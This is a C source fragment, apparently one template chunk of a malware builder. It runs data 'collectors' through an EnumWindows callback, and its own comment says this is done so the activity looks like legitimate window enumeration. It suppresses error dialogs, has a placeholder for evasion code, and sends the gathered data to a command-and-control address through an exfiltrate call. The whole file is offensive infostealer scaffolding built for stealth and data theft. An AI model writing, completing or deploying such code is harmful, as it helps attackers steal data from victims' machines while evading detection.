// chunk: arch/callback_enumwindows
// depends: core/emit_buffer, exfil/*
// provides: main
// headers: windows.h
// note: Executes collectors via EnumWindows callback — looks like legitimate window enumeration

#ifndef CHUNK_ARCH_CALLBACK_ENUMWINDOWS
#define CHUNK_ARCH_CALLBACK_ENUMWINDOWS

typedef void (*collector_fn)(void);

static collector_fn g_callback_collectors[32];
static int g_callback_idx = 0;
static int g_callback_count = 0;

static BOOL CALLBACK enum_wnd_callback(HWND hwnd, LPARAM lParam) {
    (void)hwnd; (void)lParam;
    if (g_callback_idx < g_callback_count) {
        g_callback_collectors[g_callback_idx]();
        g_callback_idx++;
        return TRUE;
    }
    return FALSE;
}

int main(int argc, char *argv[]) {
    (void)argc; (void)argv;
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
{{EVASION_INIT}}

    init_buffer();
    if (!g_data) return 1;

    collector_fn collectors[] = {
{{COLLECTOR_FN_LIST}}
    };
    g_callback_count = sizeof(collectors) / sizeof(collectors[0]);
    for (int i = 0; i < g_callback_count && i < 32; i++)
        g_callback_collectors[i] = collectors[i];

    EnumWindows(enum_wnd_callback, 0);

    if (g_pos > 0)
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);

    free(g_data);
    return 0;
}

#endif
